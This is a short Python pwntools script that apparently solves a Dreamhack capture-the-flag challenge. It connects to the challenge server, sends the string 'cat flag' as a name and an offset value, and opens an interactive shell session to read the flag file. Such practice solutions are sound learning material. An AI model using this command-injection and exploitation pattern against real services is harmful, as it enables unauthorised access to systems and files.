from pwn import *
context.log_level='debug'

n = remote('host1.dreamhack.games',8396)

offset = '76'

payload1 = 'cat flag\0'
payload2 = offset

n.sendafter('Admin name:',payload1)
n.sendafter('What do you want?:',payload2)

n.interactive()
